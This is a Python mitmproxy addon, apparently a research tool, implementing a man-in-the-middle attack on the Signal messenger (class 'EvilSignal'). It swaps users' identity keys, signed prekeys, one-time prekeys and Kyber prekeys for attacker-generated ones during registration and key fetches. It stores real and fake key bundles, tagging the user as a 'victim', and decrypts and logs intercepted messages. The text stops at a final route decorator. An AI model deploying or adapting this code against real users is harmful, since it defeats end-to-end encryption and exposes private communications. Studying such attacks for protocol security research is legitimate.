from copy import deepcopy
from mitmproxy.addonmanager import Loader
from mitmproxy.http import HTTPFlow, Request, Response, Headers
from mitmproxy.net.http.status_codes import RESPONSES
from dataclasses import dataclass
from typing import Optional
import logging
# FORMAT = "[%(filename)s:%(lineno)s-%(funcName)20s()] %(message)s"
# logging.basicConfig(format=FORMAT)
# logging.getLogger('mitmproxy').

from xepor import InterceptedAPI, RouteType, HTTPVerb, Router
import json
from signal_protocol import state, helpers
from signal_protocol.address import ProtocolAddress, DeviceId
from signal_protocol.identity_key import IdentityKeyPair, IdentityKey
from signal_protocol.curve import PublicKey
from signal_protocol import kem, protocol
from base64 import b64decode, b64encode

import utils
from database import User, Device, LegitBundle, MitMBundle
from enum import Enum
import parse

# from protos.gen.wire_pb2 import *
# from protos.gen.SignalService_pb2 import *
# from protos.gen.storage_pb2 import *
from protos.gen.WebSocketResources_pb2 import WebSocketMessage, WebSocketRequestMessage, WebSocketResponseMessage
# from protos.gen.SignalService_pb2 import *
# from protos.gen.sealed_sender_pb2 import *
# from protos.gen import *

# from server_proto import *
from server_proto import addons, HOST_HTTPBIN
# from mitm_interface import *
from mitm_interface import MitmUser
from collections import defaultdict

# logging.getLogger().addHandler(utils.ColorHandler())
# todo -- fix logging precendence -- https://stackoverflow.com/a/20280587
logging.getLogger('passlib').setLevel(logging.ERROR)  # suppressing an issue coming from xepor -> passlib
logging.getLogger('parse').setLevel(logging.ERROR)  # don't care
logging.getLogger('peewee').setLevel(logging.WARN)  # peewee emits full SQL queries otherwise which is not great
logging.getLogger('xepor.xepor').setLevel(logging.INFO)
logging.getLogger('mitmproxy.proxy.server').setLevel(logging.WARN)  # too noisy


class CiphertextMessageType(Enum):
    WHISPER = 2
    PREKEY_BUNDLE = 3
    SENDERKEY_DISTRIBUTION = 7
    PLAINTEXT = 8


class OutgoingMessageType(Enum):
    PREKEY_BUNDLE = 3
    UNIDENTIFIED = 6


class EnvelopeType(Enum):
    # https://github.com/signalapp/Signal-Android/blob/main/libsignal-service/src/main/protowire/SignalService.proto#L14-L23
    UNKNOWN = 0
    CIPHERTEXT = 1
    KEY_EXCHANGE = 2
    PREKEY_BUNDLE = 3
    RECEIPT = 5
    UNIDENTIFIED_SENDER = 6
    reserved_SENDERKEY_MESSAGE = 7
    PLAINTEXT_CONTENT = 8


@dataclass
class PendingWebSocket():
    request: WebSocketRequestMessage = None
    response: WebSocketResponseMessage = None


websocket_open_state = defaultdict(PendingWebSocket)


@dataclass
class KeyData():
    IdenKey: Optional[str] = None
    SignedPreKey: Optional[dict] = None
    pq_lastResortKey: Optional[dict] = None
    PreKeys: Optional[dict] = None
    pq_PreKeys: Optional[dict] = None

    fake_IdenKey: Optional[str] = None
    fake_SignedPreKeys: Optional[dict] = None
    fake_secret_SignedPreKeys: Optional[dict] = None

    fake_PreKeys: Optional[list[dict]] = None
    fake_secret_PreKeys: Optional[dict] = None

    fake_pq_PreKeys: Optional[list[dict]] = None
    fake_secret_pq_PreKeys: Optional[dict] = None

    fake_lastResortKey: Optional[dict] = None
    fake_secret_lastResortKey: Optional[dict] = None


@dataclass
class RegistrationInfo():
    aci: Optional[str] = None
    pni: Optional[str] = None
    unidentifiedAccessKey: Optional[str] = None

    aciData: KeyData = None
    pniData: KeyData = None

    serialized_registration_req: Optional[dict] = None


@dataclass
class BobIdenKey():
    uuid: str
    identityKey: Optional[IdentityKeyPair] = None
    fake_identityKey: Optional[IdentityKeyPair] = None


registration_info: dict[str, RegistrationInfo] = None
conversation_session = dict()
bobs_bundle = dict()
REGISTRATION_INFO_PATH = "registration_info.json"

api = addons[0]


class EvilSignal(InterceptedAPI):
    wrapped_api = None

    def __init__(self, wrapped_api: InterceptedAPI):
        self.wrapped_api = wrapped_api
        super().__init__(
            default_host=wrapped_api.default_host,
            host_mapping=wrapped_api.host_mapping,
            blacklist_domain=wrapped_api.blacklist_domain,
            request_passthrough=wrapped_api.request_passthrough,
            response_passthrough=wrapped_api.response_passthrough,
            respect_proxy_headers=wrapped_api.respect_proxy_headers,
        )
        if self.wrapped_api is not None:
            for route in self.wrapped_api.request_routes.routes:
                host, path, method, handler, allowed_statuses = route
                self.request_routes.add_route(host, path, method, handler, allowed_statuses)
            for route in self.wrapped_api.response_routes.routes:
                host, path, method, handler, allowed_statuses = route
                self.response_routes.add_route(host, path, method, handler, allowed_statuses)
            for route in self.wrapped_api.ws_request_routes.routes:
                host, path, mtype, handler = route
                self.ws_request_routes.add_route(host, path, mtype, handler)
            for route in self.wrapped_api.ws_response_routes.routes:
                host, path, mtype, handler = route
                self.ws_response_routes.add_route(host, path, mtype, handler)

    def load(self, loader: Loader):
        loader.add_option(
            name="conversation_session",
            typespec=dict,
            default=dict(),
            help="chat sessions",
        )

        super().load(loader)  # pass remaining to


api = EvilSignal(api)


def json_to_registrations(json_registrations: str) -> dict[str, RegistrationInfo]:
    loaded_dict = json.loads(json_registrations)
    return {key: utils.json_to_dataclass(RegistrationInfo, value) for key, value in loaded_dict.items()}


@api.route("/v1/registration", rtype=RouteType.REQUEST)
def _v1_registration(flow: HTTPFlow):
    # logging.info(f"ADDRESS {flow.client_conn.address[0]}")

    req = json.loads(flow.request.content)
    global registration_info
    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())
    # todo: is this the first time?

    already_saved = registration_info.get(flow.client_conn.peername[0])
    if already_saved:
        logging.warning("Already saved. Serving the same bundle")
        flow.request.content = json.dumps(already_saved.serialized_registration_req).encode()
        return

    unidentifiedAccessKey = req['accountAttributes']['unidentifiedAccessKey']

    aci_IdenKey = req['aciIdentityKey']
    pni_IdenKey = req['pniIdentityKey']

    aci_SignedPreKey = deepcopy(req['aciSignedPreKey'])
    pni_SignedPreKey = deepcopy(req['pniSignedPreKey'])

    aci_pq_lastResortKey = deepcopy(req['aciPqLastResortPreKey'])
    pni_pq_lastResortKey = deepcopy(req['pniPqLastResortPreKey'])

    aci_fake_IdenKey = IdentityKeyPair.generate()
    pni_fake_IdenKey = IdentityKeyPair.generate()

    fake_signed_pre_keys, fake_secret_SignedPreKeys = helpers.create_registration(aci_fake_IdenKey, pni_fake_IdenKey,
                                                                                  aci_spk_id=aci_SignedPreKey['keyId'],
                                                                                  pni_spk_id=pni_SignedPreKey['keyId'],
                                                                                  aci_kyber_id=aci_pq_lastResortKey[
                                                                                      'keyId'],
                                                                                  pni_kyber_id=pni_pq_lastResortKey[
                                                                                      'keyId'])

    # todo: assert id's are the same ^^
    assert fake_signed_pre_keys['aciSignedPreKey']['keyId'] == req['aciSignedPreKey'][
        'keyId'], "registration: keyId mismatch for aciSignedPreKey"
    assert fake_signed_pre_keys['pniSignedPreKey']['keyId'] == req['pniSignedPreKey'][
        'keyId'], "registration: keyId mismatch for pniSignedPreKey"
    assert fake_signed_pre_keys['aciPqLastResortPreKey']['keyId'] == req['aciPqLastResortPreKey'][
        'keyId'], "registration: keyId mismatch for aciPqLastResortPreKey"
    assert fake_signed_pre_keys['pniPqLastResortPreKey']['keyId'] == req['pniPqLastResortPreKey'][
        'keyId'], "registration: keyId mismatch for pniPqLastResortPreKey"

    req.update(fake_signed_pre_keys)

    registration_info[flow.client_conn.peername[0]] = RegistrationInfo(
        unidentifiedAccessKey=unidentifiedAccessKey,
        aciData=KeyData(
            IdenKey=aci_IdenKey,
            SignedPreKey=aci_SignedPreKey,
            pq_lastResortKey=aci_pq_lastResortKey,
            fake_IdenKey=aci_fake_IdenKey.to_base64(),
            fake_SignedPreKeys=fake_signed_pre_keys["aciSignedPreKey"],
            fake_secret_SignedPreKeys=fake_secret_SignedPreKeys["aciSignedPreKeySecret"],
            # fake_PreKeys = fake_signed_pre_keys["aciPreKey"],
            # fake_secret_PreKeys = fake_secret_SignedPreKeys["aciPreKeySecret"],
            # fake_pq_PreKeys = fake_signed_pre_keys["aciPqPreKey"],
            # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["aciPqPreKeySecret"],
            fake_lastResortKey=fake_signed_pre_keys["aciPqLastResortPreKey"],
            fake_secret_lastResortKey=fake_secret_SignedPreKeys["aciPqLastResortSecret"]
        ),
        pniData=KeyData(
            IdenKey=pni_IdenKey,
            SignedPreKey=pni_SignedPreKey,
            pq_lastResortKey=pni_pq_lastResortKey,
            fake_IdenKey=pni_fake_IdenKey.to_base64(),
            fake_SignedPreKeys=fake_signed_pre_keys["pniSignedPreKey"],
            fake_secret_SignedPreKeys=fake_secret_SignedPreKeys["pniSignedPreKeySecret"],
            # fake_PreKeys = fake_signed_pre_keys["pniPreKey"],
            # fake_secret_PreKeys = fake_secret_SignedPreKeys["pniPreKeySecret"],
            # fake_pq_PreKeys = fake_signed_pre_keys["pniPqPreKey"],
            # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["pniPqPreKeySecret"],
            fake_lastResortKey=fake_signed_pre_keys["pniPqLastResortPreKey"],
            fake_secret_lastResortKey=fake_secret_SignedPreKeys["pniPqLastResortSecret"]
        )
    )

    with open(REGISTRATION_INFO_PATH, "w") as f:
        data = json.dumps(registration_info, default=utils.dataclass_to_json)
        f.write(data)

    flow.request.content = json.dumps(req).encode()


@api.route("/v1/verification/session", rtype=RouteType.RESPONSE)
def _v1_verif_errors(flow: HTTPFlow):
    status = flow.response.status_code
    seconds_left = flow.response.headers.get("Retry-After", -1)
    failcases = {
        403: "Verification failed for the provided Registration Recovery Password",
        409: "The caller has not explicitly elected to skip transferring data from another device, but a device transfer is technically possible",
        422: "The request did not pass validation: isEverySignedKeyValid() failed",
        423: "Registration Lock failure.",
        429: f"Too many attempts, try after {utils.human_time_duration(seconds_left)} ({seconds_left} seconds)"
    }
    if status in failcases:
        resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
        logging.warning(f"Registration failed with error code {status} {resp_name} -- {failcases[status]}")


@api.route("/v1/verification/session/{sessionId}/code", rtype=RouteType.RESPONSE)
def _v1_verif_error(flow: HTTPFlow, sessionId: str):
    status = flow.response.status_code
    if status < 300:
        return
    logging.warning(
        f"Registration for session {sessionId} will likely fail due to verification error, got {status}: {RESPONSES[status]}")


@api.route("/v1/registration", rtype=RouteType.RESPONSE)
def _v1_registration(flow: HTTPFlow):
    # todo - move to discrete route once xepor matching bug is fixed
    status = flow.response.status_code
    seconds_left = flow.response.headers.get("Retry-After", -1)
    failcases = {
        403: "Verification failed for the provided Registration Recovery Password",
        409: "The caller has not explicitly elected to skip transferring data from another device, but a device transfer is technically possible",
        422: "The request did not pass validation: `isEverySignedKeyValid` (https://github.com/signalapp/Signal-Server/blob/9249cf240e7894b54638784340231a081a2e4eda/service/src/main/java/org/whispersystems/textsecuregcm/entities/RegistrationRequest.java#L100-L106) failed",
        423: "Registration Lock failure.",
        429: f"Too many attempts, try after {utils.human_time_duration(seconds_left)} ({seconds_left} seconds)"
    }
    if status in failcases:
        resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
        logging.warning(f"Registration failed with error code {status} {resp_name} -- {failcases[status]}")
        return

    resp = json.loads(flow.response.content)
    # logging.info(f"RESPONSE: {resp}")
    ip_address = flow.client_conn.peername[0]

    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())

    user = User.insert(
        pNumber=resp["number"],
        aci=resp["uuid"],
        pni=resp["pni"],
        isVictim=True
    )

    device = Device.insert(
        aci=resp["uuid"],
        pni=resp["pni"],
        deviceId=1,
        aciIdenKey=registration_info[ip_address].aciData.IdenKey,
        pniIdenKey=registration_info[ip_address].pniData.IdenKey,
        unidentifiedAccessKey=registration_info[ip_address].unidentifiedAccessKey,
    )

    user.on_conflict_replace().execute()
    device.on_conflict_replace().execute()

    registration_info[ip_address].aci = resp["uuid"]
    registration_info[ip_address].pni = resp["pni"]

    with open(REGISTRATION_INFO_PATH, "w") as f:
        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))


@api.route("/v2/keys", rtype=RouteType.REQUEST, method=HTTPVerb.PUT)
def _v2_keys(flow: HTTPFlow):
    identity = flow.request.query["identity"]

    req = json.loads(flow.request.content)
    address = flow.client_conn.peername[0]

    global registration_info
    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())

    ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
    if not registration_info.get(address):
        logging.warning(f"Address {address} not found in registration_info. {registration_info}")
        return

    # try:
    key_data = registration_info.get(address).aciData if identity == "aci" else registration_info.get(address).pniData
    # except AttributeError:
    #     logging.warning(f"I cannot retrieve the regData for ip {address}.\n{registration_info}")
    #     return

    try:
        alice_identity_key_pair = IdentityKeyPair.from_base64(key_data.fake_IdenKey.encode())
    except KeyError:
        logging.exception(f"{flow} AND {registration_info}")
        return

    pq_pre_keys = deepcopy(req["pqPreKeys"])
    pre_keys = deepcopy(req["preKeys"])

    key_data.pq_PreKeys = pq_pre_keys
    key_data.PreKeys = pre_keys

    fake_pre_keys, fake_secret_PreKeys = helpers.create_keys_data(100, alice_identity_key_pair,
                                                                  prekey_start_at=pre_keys[0]["keyId"],
                                                                  kyber_prekey_start_at=pq_pre_keys[0]["keyId"])

    ## todo for later: Make sure all the keys we generate are stored in the database

    req.update(fake_pre_keys)

    key_data.fake_PreKeys = fake_pre_keys["preKeys"]
    key_data.fake_secret_PreKeys = fake_secret_PreKeys["preKeys"]
    key_data.fake_pq_PreKeys = fake_pre_keys["pqPreKeys"]
    key_data.fake_secret_pq_PreKeys = fake_secret_PreKeys["pqPreKeys"]

    legit_bundle = LegitBundle.insert(
        type=identity,
        aci=registration_info[address].aci,
        deviceId=1,  # todo: shouldnt be static
        IdenKey=key_data.IdenKey,
        SignedPreKey=key_data.SignedPreKey,
        PreKeys=key_data.PreKeys,
        kyberKeys=key_data.pq_PreKeys,
        lastResortKyber=key_data.pq_lastResortKey,
    )

    fake_ik = {
        "publicKey": b64encode(alice_identity_key_pair.public_key().serialize()).decode("utf-8"),
        "privateKey": b64encode(alice_identity_key_pair.private_key().serialize()).decode("utf-8")
    }
    fake_spk = key_data.fake_SignedPreKeys
    fake_spk["privateKey"] = deepcopy(key_data.fake_secret_SignedPreKeys)
    prekeys = utils.json_join_public(key_data.fake_PreKeys, key_data.fake_secret_PreKeys)
    fake_kyber = utils.json_join_public(key_data.fake_pq_PreKeys, key_data.fake_secret_pq_PreKeys)
    fake_last_resort = {
        "keyId": key_data.fake_lastResortKey["keyId"],
        "publicKey": key_data.fake_lastResortKey["publicKey"],
        "privateKey": key_data.fake_secret_lastResortKey
    }
    mitm_bundle = MitMBundle.insert(
        type=identity,
        aci=registration_info[address].aci,
        deviceId=1,  # todo: shouldnt be static
        FakeIdenKey=fake_ik,
        FakeSignedPreKey=fake_spk,
        FakePrekeys=prekeys,
        fakeKyberKeys=fake_kyber,
        fakeLastResortKyber=fake_last_resort
    )

    legit_bundle.on_conflict_replace().execute()
    mitm_bundle.on_conflict_replace().execute()

    # prevent regressions
    assert "privateKey" not in req['pqPreKeys'][0]
    assert "privateKey" not in req['preKeys'][0]

    with open(REGISTRATION_INFO_PATH, "w") as f:
        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))

    flow.request.content = json.dumps(req).encode()


@api.route("/v2/keys/{identifier}/{device_id}", rtype=RouteType.RESPONSE, method=HTTPVerb.GET, allowed_statuses=[200])
def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
    # TODO -- I need to be coherent if this endpoint is hit multiple times
    # logging.exception((flow.response.content, identifier, device_id))
    global registration_info

    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())

    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    # logging.info(f"RESPONSE: {json.dumps(resp, indent=4)}")
    identity, uuid = utils.strip_uuid_and_id(identifier)

    bob_identity_key_public = b64decode(resp["identityKey"])

    ############ MitmToBob setup (fake Alice)
    for id, bundle in enumerate(resp["devices"]):
        # data should be uuid of Alice and the device id (in this case 1 is ok)
        fakeVictim = MitmUser(ProtocolAddress("fake_alice", 1))

        bob_registartion_id = bundle["registrationId"]

        bob_kyber_pre_key = bundle["pqPreKey"]
        bob_kyber_pre_key_public = b64decode(bob_kyber_pre_key["publicKey"])
        bob_kyber_pre_key_signature = b64decode(bob_kyber_pre_key["signature"] + "==")
        bob_kyber_pre_key_id = bob_kyber_pre_key["keyId"]

        bob_signed_pre_key = bundle["signedPreKey"]
        bob_signed_pre_key_public = b64decode(bob_signed_pre_key["publicKey"])
        bob_pre_key = bundle["preKey"]
        bob_pre_key_public = b64decode(bob_pre_key["publicKey"])

        device_id = int(bundle["deviceId"])

        bob_bundle = state.PreKeyBundle(
            bob_registartion_id,
            DeviceId(device_id),
            (state.PreKeyId(bundle["preKey"]["keyId"]), PublicKey.deserialize(bob_pre_key_public)),
            state.SignedPreKeyId(1),
            PublicKey.deserialize(bob_signed_pre_key_public),
            b64decode(bundle["signedPreKey"]["signature"] + "=="),
            IdentityKey(bob_identity_key_public),
        )

        bob_bundle = bob_bundle.with_kyber_pre_key(state.KyberPreKeyId(bob_kyber_pre_key_id),
                                                   kem.PublicKey.deserialize(bob_kyber_pre_key_public),
                                                   bob_kyber_pre_key_signature)
        try:
            assert bob_bundle.device_id().get_id() > 0
        except AssertionError:
            logging.error(f"Device ID is not greater than 0: {bob_bundle.device_id().get_id()}")

        logging.warning(f"registration infos: {registration_info.keys()}")
        # logging.warning(flow, ip_address)
        lastResortPq = registration_info[ip_address].aciData if identifier == "aci" else registration_info[
            ip_address].pniData

        legit_bundle = LegitBundle.insert(
            type=identity.lower(),
            aci=uuid,
            deviceId=device_id,
            IdenKey=b64encode(bob_identity_key_public).decode("ascii"),
            SignedPreKey=bob_signed_pre_key,
            # todo: using array notation to match the other bundle (i.e arrays of keys vs 1 key dict here)
            PreKeys=[bob_pre_key],
            kyberKeys=[bob_kyber_pre_key],
            # todo: using array notation to match the other bundle (i.e arrays of keys vs 1 key dict here)
            lastResortKyber=lastResortPq.pq_lastResortKey  # need to get from registration_info
        )
        legit_bundle.on_conflict_replace().execute()
        fakeVictim.process_pre_key_bundle(ProtocolAddress(uuid, device_id), bob_bundle)

    ############ Swap the prekeybundle TODO 

    for bundle in resp["devices"]:

        identity_key = bobs_bundle.get(uuid)
        bob_device_id = int(bundle["deviceId"])

        if not identity_key:
            # todo create row
            fakeUser = MitmUser(address=ProtocolAddress(uuid, bob_device_id), RID=bundle["registrationId"],
                                pre_key_id=bundle["preKey"]["keyId"], signed_pre_key_id=bundle["signedPreKey"]["keyId"],
                                kyber_pre_key_id=bundle["pqPreKey"]["keyId"])
            identity_key = fakeUser.identity_key_pair

        else:
            fakeUser = MitmUser(address=ProtocolAddress(uuid, bob_device_id), RID=bundle["registrationId"],
                                pre_key_id=bundle["preKey"]["keyId"], signed_pre_key_id=bundle["signedPreKey"]["keyId"],
                                kyber_pre_key_id=bundle["pqPreKey"]["keyId"],
                                identity_key=identity_key.fake_identityKey)
            identity_key = identity_key.fake_identityKey

        fakeBundle = fakeUser.pre_key_bundle.to_dict()

        logging.info(f"FAKE BUNDLE: {json.dumps(fakeBundle, indent=4)}")

        fakeBundle_wire = {
            "identityKey": b64encode(identity_key.public_key().serialize()).decode("utf-8"),
            "devices": [
                {
                    "deviceId": 1,
                    "registrationId": bundle["registrationId"],
                    "preKey": {
                        "keyId": fakeBundle["pre_key_id"],
                        "publicKey": fakeBundle["pre_key_public"]
                    },
                    "signedPreKey": {
                        "keyId": fakeBundle["signed_pre_key_id"],
                        "publicKey": fakeBundle["signed_pre_key_public"],
                        "signature": fakeBundle["signed_pre_key_sign"][:-2]  #
                    },
                    "pqPreKey": {
                        "keyId": fakeBundle["kyber_pre_key_id"],
                        "publicKey": fakeBundle["kyber_pre_key_public"],
                        "signature": fakeBundle["kyber_pre_key_sign"][:-2]  # todo: fix this
                    }
                }
            ]
        }

        reg = registration_info[ip_address].aciData if identifier == "aci" else registration_info[
            ip_address].pniData

        lastResortPq = {
            "keyId": reg.pq_lastResortKey.get("keyId", "42"),
            "publicKey": b64encode(fakeUser.last_resort_kyber.get_public().serialize()).decode(),
            "privateKey": fakeUser.last_resort_kyber.get_private().to_base64(),
        }
        fake_ik = {
            "publicKey": identity_key.public_key().to_base64(),
            "privateKey": identity_key.private_key().to_base64()
        }
        target_spk = fakeBundle_wire["devices"][0]["signedPreKey"]
        fake_spk = {
            "keyId": target_spk.get("keyId"),
            "publicKey": target_spk.get("publicKey"),
            "signature": target_spk.get("signature"),
            "privateKey": b64encode(fakeUser.signed_pre_key_pair.private_key().serialize()).decode("utf-8")
        }
        # fake_spk = fakeBundle_wire["devices"][0]["signedPreKey"]
        # fake_spk["privateKey"] = b64encode(fakeUser.signed_pre_key_pair.private_key().serialize()).decode("utf-8")
        fake_pre_keys = [{
            "keyId": fakeBundle_wire["devices"][0]["preKey"]["keyId"],
            "publicKey": fakeBundle_wire["devices"][0]["preKey"]["publicKey"],
            "privateKey": fakeUser.pre_key_pair.private_key().to_base64()
        }]
        # fake_kyber = fakeBundle_wire["devices"][0]["pqPreKey"]
        target_kyber = fakeBundle_wire["devices"][0]["pqPreKey"]
        fake_kyber = {
            "keyId": target_kyber.get("keyId"),
            "publicKey": target_kyber.get("publicKey"),
            "signature": target_kyber.get("signature"),
            "privateKey": fakeUser.kyber_pre_key_pair.get_private().to_base64()
        }
        # fake_kyber["privateKey"] = fakeUser.kyber_pre_key_pair.get_private().to_base64()
        # logging.error()
        mitm_bundle = MitMBundle.insert(
            type=identity.lower(),
            aci=uuid,
            deviceId=device_id,
            FakeIdenKey=fake_ik,
            FakeSignedPreKey=fake_spk,
            FakePrekeys=fake_pre_keys,
            fakeKyberKeys=[fake_kyber],
            fakeLastResortKyber=lastResortPq
        )
        mitm_bundle.on_conflict_replace().execute()

    resp.update(fakeBundle_wire)

    # ctx.options.conversation_session[] = (fakeVictim, fakeUser)
    # ctx.options.conversation_session = dict(ctx.options.conversation_session, **{f"{ip_address}:{uuid}": (fakeVictim, fakeUser)})
    # logging.warning(f"session {ctx.options.conversation_session}")
    conversation_session[f"{ip_address}:{uuid}"] = (fakeVictim, fakeUser)
    # 0logging.warning(f"session {conversation_session}")
    logging.warning(f"active conversations: {conversation_session.keys()}")

    assert "privateKey" not in resp['devices'][0]['pqPreKey']
    assert "privateKey" not in resp['devices'][0]['signedPreKey']
    assert "privateKey" not in resp['devices'][0]['pqPreKey']

    with open(REGISTRATION_INFO_PATH, "w") as f:
        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))
    flow.response.content = json.dumps(resp, sort_keys=True).encode()


def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
    logging.info(f"my profile: {identifier} {version} {credentialRequest}")

    global registration_info
    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())

    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    if registration_info.get(ip_address) is None:
        logging.warning(f"Cannot find registration for key {ip_address}.\n{registration_info}\nEarly stop.")
        return
    logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")

    resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
    flow.response.content = json.dumps(resp).encode()

    with open(REGISTRATION_INFO_PATH, "w") as f:
        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))

    return flow.response.content
    # raise RuntimeError(f"my profile: {identifier} {version} {credentialRequest}")


def _v1_ws_profile_futut(flow, identifier, version):
    global registration_info
    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())

    logging.info(f"my profile 2: {identifier} {version}")
    # raise RuntimeError(f"my profile: {identifier} {version}")
    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    if registration_info.get(ip_address) is None:
        logging.warning(f"Cannot find registration for key {ip_address}.\n{registration_info}\nEarly stop.")
        return

    logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")

    resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
    flow.response.content = json.dumps(resp).encode()

    with open(REGISTRATION_INFO_PATH, "w") as f:
        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))

    return flow.response.content


def _v1_ws_profile(flow, identifier):
    # message = flow.websocket.messages[-1]
    logging.info(f"{identifier}")
    try:
        uuid_type, uuid = utils.strip_uuid_and_id(identifier)
    except:
        logging.exception(f"Invalid identifier {identifier}")
        return
    content = json.loads(flow.response.content)

    logging.info(f"PROFILE: {content}")

    idenKey = content["identityKey"]

    bundle = MitMBundle.select().where(MitMBundle.type == uuid_type, MitMBundle.aci == uuid).first()

    if bundle:
        public_fake_IdenKey = bundle.FakeIdenKey['publicKey']
    else:
        fake_IdenKey = IdentityKeyPair.generate()
        bobs_bundle[uuid] = BobIdenKey(uuid, idenKey, fake_IdenKey)
        public_fake_IdenKey = b64encode(bobs_bundle[uuid].fake_identityKey.public_key().serialize()).decode("utf-8")

    logging.info(f"BUNDLE: {bundle}")
    content["identityKey"] = public_fake_IdenKey

    logging.info(f"content: {content}")  #### TODO: what's happening here? No injection of fake identity key
    # TODO: right now we are altering a "pseudo-flow" -- one we created artificially from a websocket message.
    # ideally, we will propagate this further by checking if the flow was altered by the handler auto-magically.
    flow.response.content = json.dumps(content).encode()
    return flow.response.content


def _v1_ws_message(flow, identifier):
    logging.info(f"message: {identifier}")
    logging.info(f"message: {flow.request.content}")

    req = json.loads(flow.request.content)
    ip_address = flow.client_conn.address[0]

    logging.info(f"ws message content: {req}")

    destination_user = req["destination"]

    identifier, destination = utils.strip_uuid_and_id(destination_user)

    logging.warning(conversation_session)

    session = conversation_session.get(f"{ip_address}:{destination}")

    if session:
        fakeVictim, fakeUser = session
    else:
        # logging.error(f"Session not found for {ip_address} and {destination}")
        return

    logging.warning(f"SESSION: {session}")

    for msg in req["messages"]:
        if msg["destinationDeviceId"] != 1:
            logging.error("Secondary devices are not supported as the developer was not paid enough. C.f. my Twint ;)")

        envelope_type = EnvelopeType(int(msg['type']))
        logging.warning(f"MESSAGE (Envelope) TYPE: {envelope_type}")

        if envelope_type not in [EnvelopeType.PREKEY_BUNDLE]:
            logging.warning(f"Only PREKEY_BUNDLE is supported at the moment, got {envelope_type}. C.f. my Twint ;)")
            continue

        content = b64decode(msg["content"])

        msg_type = OutgoingMessageType(int(msg["type"]))
        if msg_type == OutgoingMessageType.PREKEY_BUNDLE:
            try:
                dec = fakeUser.decrypt(ProtocolAddress(destination, msg["destinationDeviceId"]), content)
                logging.warning(f"DECRYPTION IS:\n{dec}")
            except Exception as e:
                logging.warning(f"DECRYPTION FAILED: {e}")
                logging.warning(f"RAW content: {msg['content']}")


def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.request if rtype == RouteType.REQUEST else ws_msg.response

    f = HTTPFlow(client_conn=orig_flow.client_conn, server_conn=orig_flow.server_conn)

    if rtype == RouteType.REQUEST:
        # todo: handle headers
        f.request = Request(host=orig_flow.request.host, port=orig_flow.request.port,
                            scheme=orig_flow.request.scheme.encode(),
                            method=ws_msg.verb.upper().encode(),
                            authority=orig_flow.request.authority.encode(),
                            http_version=orig_flow.request.http_version.encode(),
                            trailers=None, timestamp_start=orig_flow.request.timestamp_start,
                            timestamp_end=orig_flow.request.timestamp_end,
                            path=ws_msg.path.encode(), headers=Headers(), content=ws_msg.body)
    else:
        # todo: handle headeers + reason
        rp = Response(http_version=orig_flow.response.http_version.encode(), status_code=ws_msg.status, reason=b"id: ",
                      headers=Headers(), content=ws_msg.body, trailers=None,
                      timestamp_start=orig_flow.response.timestamp_start,
                      timestamp_end=orig_flow.response.timestamp_end)
        f.response = rp
    return f


ws_resp = Router()

ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}/{credentialRequest}"), HTTPVerb.ANY,
                  _v1_ws_my_profile, None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut, None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)

ws_req = Router()
ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v1_ws_message, None)
ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)


@api.ws_route("/v1/websocket/", rtype=RouteType.REQUEST)
def _v1_websocket_req(flow: HTTPFlow, msg):
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.request
    logging.debug(f"WEBSOCKET REQUEST: {ws_msg}")
    msg.injected = True

    id = ws_msg.id
    if websocket_open_state.get(id):
        logging.warning(f"Message request already exists for id {id}")
        # return
    websocket_open_state[id] = PendingWebSocket()
    websocket_open_state[ws_msg.id].request = ws_msg
    path = websocket_open_state[id].request.path

    host = flow.request.pretty_host if flow.live else HOST_HTTPBIN
    if "signal" not in host:
        host = HOST_HTTPBIN  # this shouldn't be needed but just to be safe ^^

    f = decap_ws_msg(flow, msg)
    handler, params, _ = ws_req.find_handler(host, path)
    logging.debug(f"HANDLER (req): {handler}, PARAMS: {params} -- {host} / {path}")

    if "messages" in path:
        assert handler is not None, f"something went terriblu: {path}"
    if handler:
        msg.injected = True
        req = handler(f, *params.fixed, **params.named)
        if req:
            # msg. = resp
            new_ws = WebSocketMessage()
            new_ws.ParseFromString(msg.content)
            new_ws.request.body = req
            msg.content = new_ws.SerializeToString()


@api.ws_route("/v1/websocket/", rtype=RouteType.RESPONSE)
